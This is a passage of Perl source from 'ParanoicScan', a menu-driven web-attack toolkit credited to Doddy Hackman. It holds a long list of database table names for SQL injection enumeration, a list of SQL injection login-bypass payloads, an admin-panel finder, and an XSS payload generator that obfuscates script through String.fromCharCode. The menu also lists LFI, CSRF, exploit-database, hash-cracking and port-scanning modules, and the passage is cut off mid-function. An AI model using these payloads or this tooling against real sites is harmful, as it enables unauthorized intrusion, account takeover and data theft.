    'korisnici',                     'kpro_adminlogs',
    'kpro_user',                     'links',
    'login_admin',                   'login_admins',
    'login_user',                    'login_users',
    'logins',                        'logs',
    'lost_pass',                     'lost_passwords',
    'lostpass',                      'lostpasswords',
    'm_admin',                       'main',
    'mambo_session',                 'mambo_users',
    'manage',                        'manager',
    'mb_users',                      'member',
    'memberlist',                    'members',
    'minibbtable_users',             'mitglieder',
    'movie',                         'movies',
    'mybb_users',                    'mysql',
    'mysql.user',                    'names',
    'news',                          'news_lostpass',
    'newsletter',                    'nuke_authors',
    'nuke_bbconfig',                 'nuke_config',
    'nuke_popsettings',              'nuke_users',
    'ÓÃ»§',                      'obb_profiles',
    'order',                         'orders',
    'parol',                         'partner',
    'partners',                      'passes',
    'passwords',                     'perdorues',
    'perdoruesit',                   'phorum_session',
    'phorum_user',                   'phorum_users',
    'phpads_clients',                'phpads_config',
    'phpbb_users',                   'phpBB2.forum_users',
    'phpBB2.phpbb_users',            'phpmyadmin.pma_table_info',
    'pma_table_info',                'poll_user',
    'punbb_users',                   'pwds',
    'reg_user',                      'reg_users',
    'registered',                    'reguser',
    'regusers',                      'session',
    'sessions',                      'settings',
    'shop.cards',                    'shop.orders',
    'site_login',                    'site_logins',
    'sitelogin',                     'sitelogins',
    'sites',                         'smallnuke_members',
    'smf_members',                   'SS_orders',
    'statistics',                    'superuser',
    'sysadmins',                     'system',
    'sysuser',                       'sysusers',
    'table',                         'tables',
    'tb_admin',                      'tb_administrator',
    'tb_login',                      'tb_member',
    'tb_members',                    'tb_user',
    'tb_username',                   'tb_usernames',
    'tb_users',                      'tbl',
    'tbl_user',                      'tbl_users',
    'tbluser',                       'tbl_clients',
    'tbl_client',                    'tblclients',
    'tblclient',                     'test',
    'usebb_members',                 'user_admin',
    'user_info',                     'user_list',
    'user_logins',                   'user_names',
    'usercontrol',                   'userinfo',
    'userlist',                      'userlogins',
    'usernames',                     'userrights',
    'users',                         'vb_user',
    'vbulletin_session',             'vbulletin_user',
    'voodoo_members',                'webadmin',
    'webadmins',                     'webmaster',
    'webmasters',                    'webuser',
    'webusers',                      'x_admin',
    'xar_roles',                     'xoops_bannerclient',
    'xoops_users',                   'yabb_settings',
    'yabbse_settings',               'ACT_INFO',
    'ActiveDataFeed',                'Category',
    'CategoryGroup',                 'ChicksPass',
    'ClickTrack',                    'Country',
    'CountryCodes1',                 'CustomNav',
    'DataFeedPerformance1',          'DataFeedPerformance2',
    'DataFeedPerformance2_incoming', 'DataFeedShowtag1',
    'DataFeedShowtag2',              'DataFeedShowtag2_incoming',
    'dtproperties',                  'Event',
    'Event_backup',                  'Event_Category',
    'EventRedirect',                 'Events_new',
    'Genre',                         'JamPass',
    'MyTicketek',                    'MyTicketekArchive',
    'News',                          'PerfPassword',
    'PerfPasswordAllSelected',       'Promotion',
    'ProxyDataFeedPerformance',      'ProxyDataFeedShowtag',
    'ProxyPriceInfo',                'Region',
    'SearchOptions',                 'Series',
    'Sheldonshows',                  'StateList',
    'States',                        'SubCategory',
    'Subjects',                      'Survey',
    'SurveyAnswer',                  'SurveyAnswerOpen',
    'SurveyQuestion',                'SurveyRespondent',
    'sysconstraints',                'syssegments',
    'tblRestrictedPasswords',        'tblRestrictedShows',
    'TimeDiff',                      'Titles',
    'ToPacmail1',                    'ToPacmail2',
    'UserPreferences',               'uvw_Category',
    'uvw_Pref',                      'uvw_Preferences',
    'Venue',                         'venues',
    'VenuesNew',                     'X_3945',
    'tblArtistCategory',             'tblArtists',
    'tblConfigs',                    'tblLayouts',
    'tblLogBookAuthor',              'tblLogBookEntry',
    'tblLogBookImages',              'tblLogBookImport',
    'tblLogBookUser',                'tblMails',
    'tblNewCategory',                'tblNews',
    'tblOrders',                     'tblStoneCategory',
    'tblStones',                     'tblUser',
    'tblWishList',                   'VIEW1',
    'viewLogBookEntry',              'viewStoneArtist',
    'vwListAllAvailable',            'CC_info',
    'CC_username',                   'cms_user',
    'cms_users',                     'cms_admin',
    'cms_admins',                    'jos_user',
    'table_user',                    'bulletin',
    'cc_info',                       'login_name',
    'admuserinfo',                   'userlistuser_list',
    'SiteLogin',                     'Site_Login',
    'UserAdmin',                     'Admins',
    'Login',                         'Logins'
);

my @bypass = split /\n/, <<'EOS';
admin'--
'or'1'='1
'or'
' or 0=0 --
" or 0=0 --
or 0=0 --
' or 0=0 #
" or 0=0 #
or 0=0 #
' or 'x'='x
" or "x"="x
') or ('x'='x
' or 1=1--
" or 1=1--
or 1=1--
' or a=a--
" or "a"="a
') or ('a'='a
") or ("a"="a
hi" or "a"="a
hi" or 1=1 --
hi' or 1=1 --
hi' or 'a'='a
hi') or ('a'='a
hi") or ("a"="a
- ' or 'x'='x
- ' or 'x'='x
'or'1 ou 'or''='
 ' or 'x'='x
admin' or 1==1
' OR "='
'or'1'='1
EOS

my @files_gen = (
    'kobra',            'sql-logs.txt',
    'logs-bypass.txt',  'jetdb-logs.txt',
    'mssql-logs.txt',   'oracle-logs.txt',
    'rfi-logs.txt',     'lfi-logs.txt',
    'xss-logs.txt',     'fpd-logs.txt',
    'csrf',             'fsd',
    'paths-logs.txt',   'admin-logs.txt',
    'hashes-found.txt', 'http-logs.txt',
    'exploitdb'
);

my @files_chau_gen = (
    'kobra.html', 'sqli.html',   'bypass.html', 'jetdb.html',
    'mssql.html', 'oracle.html', 'rfi.html',    'lfi.html',
    'xss.html',   'fpd.html',    'csrf.html',   'fsd.html',
    'paths.html', 'admin.html',  'hash.html',   'http.html',
    'exploitdb.html'
);

my $comienzo_html = qq(
<title>Logs - ParanoicScan -</title>

<STYLE type=text/css>
 
body,a:link {
background-color: #000000;
color:#00FF00;
Courier New;
cursor:crosshair;
font: normal 0.7em sans-serif,Arial;
}
 
input,textarea,fieldset,select,table,td,tr,option,select {
font: normal 15px Verdana, Arial, Helvetica,
sans-serif;
background-color:#000000;
color:#00FF00;
border: solid 1px #00FF00;
border-color:#00FF00
}
 
a:link,a:visited,a:active {
color:#00FF00;
font: normal 15px Verdana, Arial, Helvetica,
sans-serif;
text-decoration: none;
}
 
</style>

<center>
<br><h1>Logs - ParanoicScan -</h1><br><br>
);

my $final_html = qq(
<br><br><h1><b>-- == (C) Doddy Hackman 2014 == --</b></h1>

</center>);

my $logs_index = qq(
<title>Logs - ParanoicScan -</title>

<STYLE type=text/css>
 
body,a:link {
background-color: #000000;
color:#00FF00;
Courier New;
cursor:crosshair;
font: normal 0.7em sans-serif,Arial;
}
 
input,textarea,fieldset,select,table,td,tr,option,select {
font: normal 15px Verdana, Arial, Helvetica,
sans-serif;
background-color:#000000;
color:#00FF00;
border: solid 1px #00FF00;
border-color:#00FF00
}
 
a:link,a:visited,a:active {
color:#00FF00;
font: normal 15px Verdana, Arial, Helvetica,
sans-serif;
text-decoration: none;
}
 
</style>

<center>
<br><h1>Logs - ParanoicScan -</h1><br><br>
<table border=1>
<td><b>Logs</b></td><tr>
<td><a href=kobra.html>K0bra</a></td><tr>
<td><a href=sqli.html>SQLI Links</a></td><tr>
<td><a href=bypass.html>ByPass</a></td><tr>
<td><a href=jetdb.html>JetDB</a></td><tr>
<td><a href=mssql.html>MSSQL</a></td><tr>
<td><a href=oracle.html>Oracle</a></td><tr>
<td><a href=rfi.html>RFI</a></td><tr>
<td><a href=lfi.html>LFI</a></td><tr>
<td><a href=xss.html>XSS</a></td><tr>
<td><a href=fpd.html>Full Path Discloure</a></td><tr>
<td><a href=csrf.html>Cross Site Request Forgery</a></td><tr>
<td><a href=fsd.html>Full Source Discloure</a></td><tr>
<td><a href=paths.html>Paths</a></td><tr>
<td><a href=admin.html>Admins</a></td><tr>
<td><a href=hash.html>Hashes</a></td><tr>
<td><a href=http.html>HTTP FingerPrinting</a></td><tr>
<td><a href=exploitdb.html>ExploitDB</a></td><tr>
</table>

<br><br><h1><b>-- == (C) Doddy Hackman 2014 == --</b></h1>

</center>
);

my @logs_central = (
    "logs",           "logs_html",
    "logs/webs",      "logs/fsdlogs",
    "logs/csrf",      "logs/exploitdb/",
    "logs_html/webs", "logs_html/fsdlogs",
    "logs_html/csrf", "logs_html/exploitdb/"
);

##

for my $log (@logs_central) {
    mkdir( $log, 0777 );
}

unless ( -f getcwd() . "/logs_html/logs.html" ) {
    open( FILE, ">>" . getcwd() . "/" . "logs_html/logs.html" );
    print FILE $logs_index;
    close FILE;
}

my $nave = LWP::UserAgent->new;
$nave->agent( $agents[ rand @agents ] );
$nave->timeout(10);

my $total_vulnerables;

##Test Proxy

my $now_proxy;
my $te = getdatanownownownow();

if ( $te =~ /proxy=(.*)/ ) {
    $now_proxy = $1;
    $nave->proxy( "http", "http://" . $now_proxy );
}

inicio_total();

sub inicio_total {

    head_menu();

    unless ( -f "data.txt" ) {
        instalar();
    }
    else {

        #Start the menu
        my $re = menu_login();
        printear( "\n\n\t\t\t  [+] Checking ...\n\n", "text", "7", "5" );
        sleep(3);
        if ( $re eq "yes" ) {
            estoydentro();
        }
        else {
            printear( "\n\t\t\t  [-] Bad Login\n\n", "text", "5", "5" );
            <stdin>;
            inicio_total();
        }
    }
    copyright_menu();
}

#Final

sub estoydentro {
    head_menu();
    menu_central();
    my $op = printear( "\n\n\t\t\t[+] Option : ", "stdin", "11", "13" );
    $SIG{INT} = \&estoydentroporahora; ## Comment on this line to compile to exe
    if ( $op eq "1" ) {
        load_paranoic_old();
    }
    elsif ( $op eq "2" ) {
        load_kobra();
    }
    elsif ( $op eq "3" ) {
        lfi_scan();
    }
    elsif ( $op eq "4" ) {
        xss_scan();
    }
    elsif ( $op eq "5" ) {
        csrf_scan();
    }
    elsif ( $op eq "6" ) {
        load_bypass();
    }
    elsif ( $op eq "7" ) {
        load_fsd();
    }
    elsif ( $op eq "8" ) {
        load_findpaths();
    }
    elsif ( $op eq "9" ) {
        load_locateip();
    }
    elsif ( $op eq "10" ) {
        menu_crackhash();
        adios();
    }
    elsif ( $op eq "11" ) {
        clean();
        start_panel();
    }
    elsif ( $op eq "12" ) {
        httpfinger();
    }
    elsif ( $op eq "13" ) {
        portscanner();
    }
    elsif ( $op eq "14" ) {
        encodedecode();
    }
    elsif ( $op eq "15" ) {
        exploitdb();
    }
    elsif ( $op eq "16" ) {
        mysqlman();
    }
    elsif ( $op eq "17" ) {
        load_cmd();
    }
    elsif ( $op eq "18" ) {
        cargarlogs("logs_html/logs.html");
        estoydentro();
    }
    elsif ( $op eq "19" ) {
        head_menu();
        printear(
"\n\n\t   This program was coded By Doddy Hackman in the year 2014\n\n\n\n",
            "text", "13", "5"
        );
        <stdin>;
        estoydentro();
    }
    elsif ( $op eq "20" ) {
        my $op = printear( "\n\n\t\t\t[+] Good Bye\n", "stdin", "7", "13" );

        #<stdin>;
        genlogs();
        exit(1);
    }
    else {
        estoydentro();
    }    #Fin de control
}

sub estoydentroporahora {
    my $op = printear( "\n\n\n\t\t[+] Press any key for return to the menu",
        "stdin", "7", "13" );

    #<stdin>;
    estoydentro();
}

sub menu_central {

    printear( "\n\n\t\t\t -- == Options == --\n\n", "text", "13", "5" );
    printear(
        "\n
\t\t\t[+] 1 : Web Scanner
\t\t\t[+] 2 : SQLi Scanner
\t\t\t[+] 3 : LFI Scanner
\t\t\t[+] 4 : XSS Tool
\t\t\t[+] 5 : CSRF Tool
\t\t\t[+] 6 : Bypass Admin
\t\t\t[+] 7 : FSD Exploit Manager
\t\t\t[+] 8 : Paths Finder
\t\t\t[+] 9 : Locate IP
\t\t\t[+] 10 : Crack MD5
\t\t\t[+] 11 : Panel Finder
\t\t\t[+] 12 : HTTP FingerPrinting
\t\t\t[+] 13 : Port Scanner
\t\t\t[+] 14 : Encoder & Decoder
\t\t\t[+] 15 : Exploit DB Manager
\t\t\t[+] 16 : Mysql Manager
\t\t\t[+] 17 : Console
\t\t\t[+] 18 : Generate LOGS
\t\t\t[+] 19 : About
\t\t\t[+] 20 : Exit
", "logos", "7", "5"
    );
}

sub menu_login {

    my $test_username = "";
    my $test_password = "";

    printear( "\n\n\t\t\t  -- == Login == --\n\n\n\n", "text", "13", "5" );
    my $username = printear( "\t\t\t[+] Username : ",   "stdin", "11", "13" );
    my $password = printear( "\n\t\t\t[+] Password : ", "stdin", "11", "13" );

    my $word = getdatanownownownow();

    if ( $word =~ /username=(.*)/ ) {
        $test_username = $1;
    }

    if ( $word =~ /password=(.*)/ ) {
        $test_password = $1;
    }

    if (    $test_username eq md5_hex($username)
        and $test_password eq md5_hex($password) )
    {
        return "yes";
    }
    else {
        return "no";
    }

}

sub instalar {
    printear(
        "\n\n\t\t\t  -- == Program settings == --\n\n\n\n", "text",
        "13",                                               "5"
    );

    my $username = printear( "\t\t\t[+] Username : ",   "stdin", "11", "13" );
    my $password = printear( "\n\t\t\t[+] Password : ", "stdin", "11", "13" );
    my $proxy    = printear( "\n\t\t\t[+] Proxy : ",    "stdin", "11", "13" );
    my $colores =
      printear( "\n\t\t\t[+] Colors [y,n] : ", "stdin", "11", "13" );
    my $efectos =
      printear( "\n\t\t\t[+] Effects [y,n] : ", "stdin", "11", "13" );

    open( FILE, ">>data.txt" );
    print FILE "username=" . md5_hex($username) . "\n";
    print FILE "password=" . md5_hex($password) . "\n";
    if ( $proxy ne "" ) {
        print FILE "proxy=" . $proxy . "\n";
    }
    print FILE "colors=" . $colores . "\n";
    print FILE "efect=" . $efectos . "\n";
    close FILE;

    inicio_total();
}

sub head_menu {
    clean();
    printear( "


@@@@@   @   @@@@     @   @@  @@@  @@@   @@@  @@@@     @@@   @@@@    @   @@  @@@
 @  @   @    @  @    @    @@  @  @   @   @  @   @    @  @  @   @    @    @@  @ 
 @  @  @ @   @  @   @ @   @@  @ @     @  @ @         @    @        @ @   @@  @ 
 @@@   @ @   @@@    @ @   @ @ @ @     @  @ @          @@  @        @ @   @ @ @ 
 @    @@@@@  @ @   @@@@@  @ @ @ @     @  @ @            @ @       @@@@@  @ @ @ 
 @    @   @  @  @  @   @  @  @@  @   @   @  @   @    @  @  @   @  @   @  @  @@ 
@@@  @@@ @@@@@@  @@@@ @@@@@@  @   @@@   @@@  @@@     @@@    @@@  @@@ @@@@@@  @ 


", "logos", "13", "5" );

    if ( $^O =~ /Win32/ ) {

        printear( "
                                                                                   
\t\t                _____ 
\t\t         ,----/,--.   `. 
\t\t        /    '. `-'     \         
\t\t        | ____ \      '`|_        
\t\t        \'.--._/` _     \ '.      
\t\t             /'-|/ \|`\|-`  \       
\t\t            /   /       \   |    
\t\t            |  ;    '`  |  .' 
\t\t            '. |;;      ;  / 
\t\t             \ \ ;     / ,'       
\t\t             ;--,   .,--, 
\t\t           __||=|=|./|=|=||___   
\t\t             `'-'-'  `-'-'`     
\t\t        ______________________  
\t\t             /'/ /  \  \ \         
\t\t            / '.';  ; \ ' \ 
\t\t           '-/   | ; | ; \-' 
\t\t             \_| |   | |_/       
\t\t               `-'\_/`-' 
\t\t   
                                           
", "logos", "7", "5" );

    }
    else {

        printear( "

                                           
                                           
\t\t                 ¾¾¾¾¾¾¾¾¾¾¾               
\t\t              ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾           
\t\t            ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾          
\t\t          ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾         
\t\t          ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾        
\t\t         ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾       
\t\t        ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾       
\t\t        ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾       
\t\t        ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾      
\t\t         ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾      
\t\t         ¾¾¾¾¾¾¾  ¾¾¾¾¾¾¾¾¾¾¾    ¾¾¾¾       
\t\t          ¾¾¾¾       ¾¾¾¾¾¾      ¾¾¾¾       
\t\t           ¾¾¾      ¾¾¾ ¾¾¾      ¾¾¾        
\t\t           ¾¾¾¾¾¾¾¾¾¾¾   ¾¾¾   ¾¾¾¾         
\t\t            ¾¾¾¾¾¾¾¾¾     ¾¾¾¾¾¾¾¾¾         
\t\t            ¾¾¾¾¾¾¾¾¾  ¾  ¾¾¾¾¾¾¾¾¾         
\t\t            ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾         
\t\t                 ¾¾¾¾¾¾¾¾¾¾¾¾¾              
\t\t               ¾  ¾¾¾¾¾¾¾¾¾¾  ¾             
\t\t               ¾    ¾ ¾¾¾¾ ¾  ¾             
\t\t               ¾ ¾¾          ¾¾             
\t\t      ¾¾¾      ¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾             
\t\t     ¾¾¾¾¾      ¾¾¾¾¾¾¾¾¾¾¾¾¾¾      ¾¾¾     
\t\t     ¾¾¾¾¾¾¾      ¾¾¾¾¾¾¾¾¾¾¾      ¾¾¾¾¾¾   
\t\t     ¾¾¾¾¾¾¾¾¾¾      ¾¾¾         ¾¾¾¾¾¾¾¾¾  
\t\t      ¾¾¾  ¾¾¾¾¾¾             ¾¾¾¾¾¾¾¾¾¾¾   
\t\t               ¾¾¾¾¾¾     ¾¾¾¾¾¾¾           
\t\t                  ¾¾¾¾¾¾¾¾¾¾¾¾              
\t\t                   ¾¾¾¾¾¾¾¾¾                
\t\t                ¾¾¾¾¾¾¾ ¾¾¾¾¾¾¾             
\t\t            ¾¾¾¾¾¾¾         ¾¾¾¾¾¾¾         
\t\t        ¾¾¾¾¾¾¾                ¾¾¾¾¾¾¾¾¾¾   
\t\t   ¾¾¾¾¾¾¾¾                       ¾¾¾¾¾¾¾¾  
\t\t   ¾¾¾¾¾¾                           ¾¾¾¾¾¾  
\t\t    ¾¾¾¾                             ¾¾¾¾   
                                           
                                           
                                           


", "logos", "7", "5" );

    }

}

sub printear {    #
    my $test;
    my $efecto;
    my $word = getdatanownownownow();

    if ( $word =~ /colors=(.*)/ ) {
        $test = $1;
    }

    if ( $word =~ /efect=(.*)/ ) {
        $efecto = $1;
    }

    if ( $test eq "y" ) {
        if ( $_[1] eq "text" ) {

            if ( $efecto =~ /y/ ) {
                texto_raro( "\x03" . $_[2] . $_[0] . "\x030" );
            }
            else {
                cprint( "\x03" . $_[2] . $_[0] . "\x030" );
            }
        }
        elsif ( $_[1] eq "logos" ) {
            cprint( "\x03" . $_[2] . $_[0] . "\x030" );
        }
        elsif ( $_[1] eq "stdin" ) {
            if ( $_[3] ne "" ) {
                cprint( "\x03" . $_[2] . $_[0] . "\x030" . "\x03" . $_[3] );
                my $op = <stdin>;
                chomp $op;
                cprint("\x030");
                return $op;
            }
        }
        else {
            print "error\n";
        }
    }
    else {

        #
        if ( $_[1] eq "text" ) {

            if ( $efecto =~ /y/ ) {
                texto_raro( $_[0] );
            }
            else {
                print( $_[0] );
            }
        }

        elsif ( $_[1] eq "logos" ) {
            print( $_[0] );
        }

        elsif ( $_[1] eq "stdin" ) {
            if ( $_[3] ne "" ) {
                if ( $efecto =~ /y/ ) {
                    texto_raro( $_[0] );
                }
                else {
                    cprint( $_[0] );
                }
                my $op = <stdin>;
                chomp $op;
                return $op;
            }
        }
        else {
            print "error\n";
        }
    }
}    #Fin de printear

sub texto_raro {
    my @letras = split //, $_[0];
    for (@letras) {
        usleep(40_000);
        print $_;
    }
}

sub clean {
    my $os = $^O;
    if ( $os =~ /Win32/ig ) {
        system("cls");
    }
    else {
        system("clear");
    }
}

sub copyright_menu {
    printear( "\n\n\t\t\t(C) Doddy Hackman 2014\n\n", "text", "11", "5" );
    exit(1);
}

##Funciones del programa ##

sub start_panel {

    head_panel();
    my $page = printear( "[+] Page : ", "stdin", "11", "13" );

    if ( $page eq "exit" ) {
        estoydentroporahora();
    }

    my $count = printear( "\n[+] Count : ", "stdin", "11", "13" );

    if ( $count eq "" ) {
        $count = 3;
    }

    scan_panel( $page, $count );
    adios();

}

sub scan_panel {

    my $web = $_[0];

    my ( $scheme, $auth, $path, $query, $frag ) = uri_split($web);

    my $web = $scheme . "://" . $auth;

    my $count = 0;

    printear( "\n[+] Searching .....\n\n", "text", "13", "5" );

    for my $path (@paneles) {

        if ( $count eq $_[1] ) {
            last;
        }

        $code = tomados( $web . "/" . $path );

        if ( $code->is_success ) {
            $controlt = 1;
            $count++;
            printear(
                "\a\a[Link] : " . $web . "/" . $path . "\n", "text",
                "7",                                         "5"
            );

            savefile( "admin_logs.txt", $web . "/" . $path );
        }

    }

    if ( $controlt ne 1 ) {
        printear( "[-] Not found anything\n", "text", "5", "5" );
    }

}    ##

sub head_panel {
    printear( "
	

       @    @@@@    @     @  @  @    @     @@@@@ @  @    @  @@@@  
       @    @   @   @     @  @  @@   @     @     @  @@   @  @   @
      @ @   @    @  @@   @@  @  @@   @     @     @  @@   @  @    @
      @ @   @    @  @@   @@  @  @ @  @     @     @  @ @  @  @    @
     @   @  @    @  @ @ @ @  @  @ @  @     @@@@  @  @ @  @  @    @
     @   @  @    @  @ @ @ @  @  @  @ @     @     @  @  @ @  @    @
     @@@@@  @    @  @  @  @  @  @   @@     @     @  @   @@  @    @
    @     @ @   @   @  @  @  @  @   @@     @     @  @   @@  @   @
    @     @ @@@@    @     @  @  @    @     @     @  @    @  @@@@


                                              
", "logos", "7", "5" );

}

sub genlogs {

    my $cantidad = int(@files_gen);
    my $control_entrada;
    my $control_salida;
    my $contenido;
    my $nuevo_nombre;

    for my $file (@files_chau_gen) {
        unlink( getcwd() . "/logs_html/" . $file );
    }

    for my $contador ( 0 .. $cantidad - 1 ) {

        $control_entrada = $files_gen[$contador];
        $control_salida  = $files_chau_gen[$contador];

        if ( $control_entrada eq "kobra" ) {

            borrar_archivos( getcwd() . "/" . "logs_html/webs/" );

            opendir my ($listando), getcwd() . "/logs/webs/";
            my @archivos = readdir $listando;
            closedir $listando;

            savefil( "logs_html/kobra.html", $comienzo_html );

            savefil( "logs_html/kobra.html",
                "<table border=1><td>Logs</td><tr>" );

            for my $archivo (@archivos) {

                if ( -f getcwd() . "/logs/webs/" . $archivo ) {

                    $nuevo_nombre = $archivo;
                    $nuevo_nombre =~ s/.txt/.html/ig;

                    savefil( "logs_html/kobra.html",
                            "<td>"
                          . "<a href='webs/"
                          . $nuevo_nombre . "'>"
                          . $archivo . "</a>"
                          . "</td><tr>" );

                    $contenido =
                      savewords( getcwd() . "/logs/webs/" . $archivo );
                    $contenido =~ s/\n/<br>/ig;

                    savefil( "logs_html/webs/" . $nuevo_nombre,
                        $comienzo_html );
                    savefil( "logs_html/webs/" . $nuevo_nombre, "<fieldset>" );
                    savefil( "logs_html/webs/" . $nuevo_nombre, $contenido );
                    savefil( "logs_html/webs/" . $nuevo_nombre, "</fieldset>" );
                    savefil( "logs_html/webs/" . $nuevo_nombre, $final_html );

                }
            }
            savefil( "logs_html/kobra.html", "</table>" );
            savefil( "logs_html/kobra.html", $final_html );

        }
        elsif ( $control_entrada eq "csrf" ) {

            borrar_archivos( getcwd() . "/" . "logs_html/csrf/" );

            opendir my ($listando), getcwd() . "/logs/csrf/";
            my @archivos = readdir $listando;
            closedir $listando;

            savefil( "logs_html/csrf.html", $comienzo_html );
            savefil( "logs_html/csrf.html",
                "<table border=1><td>Logs</td><tr>" );

            for my $archivo (@archivos) {

                if ( -f getcwd() . "/logs/csrf/" . $archivo ) {

                    #print $archivo."\n";

                    $nuevo_nombre = $archivo;
                    $nuevo_nombre =~ s/.html/.txt/ig;

                    savefil( "logs_html/csrf/" . $nuevo_nombre,
                        savewords( getcwd() . "/logs/csrf/" . $archivo ) );

                    savefil( "logs_html/csrf.html",
                            "<td>"
                          . "<a href='csrf/"
                          . $nuevo_nombre . "'>"
                          . $nuevo_nombre . "</a>"
                          . "</td><tr>" );

                }
            }

            savefil( "logs_html/csrf.html", "</table>" );
            savefil( "logs_html/csrf.html", $final_html );

        }
        elsif ( $control_entrada eq "fsd" ) {

            borrar_archivos( getcwd() . "/" . "logs_html/fsdlogs/" );

            opendir my ($listando), getcwd() . "/logs/fsdlogs/";
            my @archivos = readdir $listando;
            closedir $listando;

            savefil( "logs_html/fsd.html", $comienzo_html );
            savefil( "logs_html/fsd.html",
                "<table border=1><td>Logs</td><tr>" );

            for my $archivo (@archivos) {

                if ( -f getcwd() . "/logs/fsdlogs/" . $archivo ) {

                    #print $archivo."\n";

                    $nuevo_nombre = $archivo;
                    $nuevo_nombre =~ s/.html/.txt/ig;
                    $nuevo_nombre =~ s/.php/.txt/ig;

                    savefil( "logs_html/fsdlogs/" . $nuevo_nombre,
                        savewords( getcwd() . "/logs/fsdlogs/" . $archivo ) );

                    savefil( "logs_html/fsd.html",
                            "<td>"
                          . "<a href='fsdlogs/"
                          . $nuevo_nombre . "'>"
                          . $nuevo_nombre . "</a>"
                          . "</td><tr>" );
                }
            }

        }

        elsif ( $control_entrada eq "exploitdb" ) {

            borrar_archivos( getcwd() . "/" . "logs_html/exploitdb/" );

            opendir my ($listando), getcwd() . "/logs/exploitdb/";
            my @archivos = readdir $listando;
            closedir $listando;

            savefil( "logs_html/exploitdb.html", $comienzo_html );

            for my $archivo (@archivos) {

                my $dircon = getcwd() . "/logs/exploitdb/" . $archivo;

                if ( -d $dircon and $archivo ne "." and $archivo ne ".." ) {

                    savefil( "logs_html/exploitdb.html",
                            "<table border=1><td><b><center>" 
                          . $archivo
                          . "</center></b></td><tr>" );

                    #print "[+] Dir : ".$dircon."\n";

                    opendir my ($listando), $dircon;
                    my @archivosmas = readdir $listando;
                    closedir $listando;

                    for my $archi (@archivosmas) {
                        if ( -f $dircon . "/" . $archi ) {

## yeah <td> </td>
                            savefil( "logs_html/exploitdb.html",
                                    "<td>"
                                  . "<a href='exploitdb/"
                                  . $archi . "'>"
                                  . $archi . "</a>"
                                  . "</td><tr>" );

                            savefil(
                                "logs_html/exploitdb/" . $archi,
                                savewords( $dircon . "/" . $archi )
                            );

                            #print "[+] File : ".$archi."\n";
                        }
                    }
                }
                savefil( "logs_html/exploitdb.html", "</table><br>" );
            }

            savefil( "logs_html/exploitdb.html", $final_html );
        }
        elsif ( $control_entrada eq "xss-logs.txt" ) {

            $contenido = savewords( "logs/" . $control_entrada );
            savefil( "logs_html/" . $control_salida, $comienzo_html );
            $contenido =~ s/\n/<br>/ig;
            $contenido =~ s/<script>/1/ig;
            $contenido =~ s/<\/script>/1/ig;
            savefil(
                "logs_html/" . $control_salida,
                "<fieldset>$contenido</fieldset>"
            );
            savefil( "logs_html/" . $control_salida, $final_html );

        }
        else {

            $contenido = savewords( "logs/" . $control_entrada );
            savefil( "logs_html/" . $control_salida, $comienzo_html );
            $contenido =~ s/\n/<br>/ig;
            savefil(
                "logs_html/" . $control_salida,
                "<fieldset>$contenido</fieldset>"
            );
            savefil( "logs_html/" . $control_salida, $final_html );

        }
    }

}

sub head_xss {
    printear( "



@     @  @@@    @@@      @@@@@   @@@@    @@@@   @    
@     @ @   @  @   @       @    @    @  @    @  @    
 @   @  @      @           @    @    @  @    @  @    
  @ @   @      @           @    @    @  @    @  @    
   @     @@@    @@@        @    @    @  @    @  @    
  @ @       @      @       @    @    @  @    @  @    
 @   @      @      @       @    @    @  @    @  @    
@     @ @   @  @   @       @    @    @  @    @  @    
@     @  @@@    @@@        @     @@@@    @@@@   @@@@@


                                              
", "logos", "7", "5" );
}

sub xss_scan {
    clean();
    head_xss();

    printear( "
[++] Options

[+] 1 : XSS Scan
[+] 2 : Generate ByPass
[+] 3 : Hide URL
[+] 4 : Exit

", "text", "13", "5" );

    my $op = printear( "[+] Option : ", "stdin", "11", "13" );

    if ( $op eq "1" ) {

        my $target = printear( "\n[+] Page : ", "stdin", "11", "13" );

        scanxss( $target, "yes" );

        adios();
    }
    elsif ( $op eq "2" ) {

        my $target = printear( "\n[+] String : ", "stdin", "11", "13" );

        if ( $target ne "" ) {
            printear(
                "\n[XSS] : <script>var code =String.fromCharCode("
                  . encode($target)
                  . "); document.write(code);</script>\n",
                "text", "13", "5"
            );
        }
        else {
            printear( "\n[-] Write the string !\n", "text", "5", "5" );
        }

        adios();

    }
    elsif ( $op eq "3" ) {

        my $nueva = printear( "\n[+] String : ", "stdin", "11", "13" );

        my $code = toma( "http://tinyurl.com/api-create.php?url=" . $nueva );

        unless ( $code =~ /Error/ig ) {
            printear( "\n[+] Link : " . $code . "\n", "text", "13", "5" );
        }
        else {
            printear( "\n[+] Error\n", "text", "5", "5" );
        }
        adios();
    }
    elsif ( $op eq "4" ) {
        adios();
    }
    else {
        adios();
    }
}

sub head_mysqlman {
    printear( "



 @     @ @     @  @@@    @@@@   @    
 @     @ @     @ @   @  @    @  @    
 @@   @@  @   @  @      @    @  @    
 @@   @@   @ @   @      @    @  @    
 @ @ @ @    @     @@@   @    @  @    
 @ @ @ @    @        @  @    @  @    
 @  @  @    @        @  @  @ @  @    
 @  @  @    @    @   @  @   @@  @    
 @     @    @     @@@    @@@@   @@@@@
                             @


                                              
", "logos", "7", "5" );
}

sub mysqlman {

    clean();
    head_mysqlman();

    my $host = printear( "[+] Hostname : ",   "stdin", "11", "13" );
    my $user = printear( "\n[+] Username : ", "stdin", "11", "13" );
    my $pass = printear( "\n[+] Password : ", "stdin", "11", "13" );

##

    printear( "\n[+] Connecting to the server\n", "text", "13", "5" );

    $info = "dbi:mysql::" . $host . ":3306";
    if ( my $enter = DBI->connect( $info, $user, $pass, { PrintError => 0 } ) )
    {

